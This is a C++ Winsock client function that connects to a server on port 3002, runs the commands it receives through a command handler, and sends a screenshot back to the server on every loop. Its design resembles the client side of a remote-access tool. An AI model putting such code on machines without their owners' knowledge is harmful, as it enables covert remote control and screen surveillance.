#include "networking.h"
const int DEFAULT_PORT = 3002;

int network::reworkedClient(char ip[])
{
	printf("[+] Attempting connection to %s\n", ip);

	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
	{
		std::cerr << "Failed to init winsock.\n";
		return -1;
	}

	SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (clientSocket == INVALID_SOCKET)
	{
		std::cerr << "Failed to create client socket.\n";
		WSACleanup();
		return -1;
	}

	sockaddr_in serverAddress;
	serverAddress.sin_family = AF_INET;
	serverAddress.sin_addr.s_addr = inet_addr(ip);
	serverAddress.sin_port = htons(DEFAULT_PORT);

	if (connect(clientSocket, reinterpret_cast<sockaddr*>(&serverAddress), sizeof(serverAddress)) == SOCKET_ERROR)
	{
		std::cerr << "Failed to connect to the server.\n";
		closesocket(clientSocket);
		WSACleanup();
		return -1;
	}

	printf("[+] Successfully connected to %s\n", ip);

	//int fastMode = 0;

	//nlohmann::json connectionInfo = networking::recvData(clientSocket);

	//std::cout << "FASTMODE = " << connectionInfo["fastMode"];

	CommandHandler commandHandler;

	while(true)
	{
		auto data = networking::recvData(clientSocket);

		std::cout << data << "\n";

		if(data == NULL)
		{
			return -1;
		}


		networking::ServerPacket serverPacket;
		serverPacket.parse(data);

		if(serverPacket.information == "Shutdown")
		{
			closesocket(clientSocket);
			WSACleanup();
			exit(0);
		}

		printf("Command: %s\n", serverPacket.command.c_str());

		commandHandler.setInput(serverPacket.command);

		data.clear();
		serverPacket.clear();

		networking::ClientPacket clientPacket;
		clientPacket.resp = "handled";
		clientPacket.screenData = commands::Screenshot_C();
		nlohmann::json clientData = clientPacket.create();
		std::cout << "ClientData: " << clientData["response"].get<std::string>() << "\n";

		commandHandler.callFunction();

		std::cout << "[+] Sending data\n";
		networking::sendData(clientSocket, clientData);
		std::cout << "[+] Data sent!\n";
	}

	closesocket(clientSocket);
	WSACleanup();

	return 0;
}